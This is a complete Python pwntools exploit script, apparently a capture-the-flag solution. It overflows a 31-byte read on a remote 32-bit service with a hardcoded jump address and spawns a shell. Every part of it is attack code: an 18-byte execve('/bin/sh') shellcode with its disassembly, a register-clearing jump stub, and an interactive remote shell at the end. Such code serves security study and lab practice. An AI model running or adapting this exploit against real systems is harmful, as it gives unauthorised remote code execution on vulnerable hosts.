#!/usr/bin/env python3
from pwn import *
import time
import getopt
import sys

opts,argv=getopt.getopt(sys.argv[1:], 't:p:')

for k,v in opts:
    if k == '-t':
        target=v
    elif k == '-p':
        port=v

io=remote(target, port)

#sleep(10)

# 18 bytes shellcode, ecx & edx needs to be 0.
#
#0:  6a 0b                   push   0xb
#2:  58                      pop    eax
#3:  51                      push   ecx
#4:  68 2f 2f 73 68          push   0x68732f2f
#9:  68 2f 62 69 6e          push   0x6e69622f
#e:  89 e3                   mov    ebx,esp
#10: cd 80                   int    0x80

shellcode=b"\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

# Read() takes in 31 bytes. First 18 bytes are shellcode.
# Next 4 bytes to overwrite return address and we have 9 bytes left.
# 8 bytes to setup registers and jmp eax, which points to vuln's buff.
#
#0:  89 c4                   mov    esp,eax
#2:  31 d2                   xor    edx,edx
#4:  31 c9                   xor    ecx,ecx
#6:  ff e0                   jmp    eax

xor_jmp=b"\x89\xc4\x31\xd2\x31\xc9\xff\xe0"
jmp_esp=0x0804919f

payload=shellcode
payload+=p32(jmp_esp)
payload+=xor_jmp

io.sendlineafter(b'>', payload) 

io.interactive()


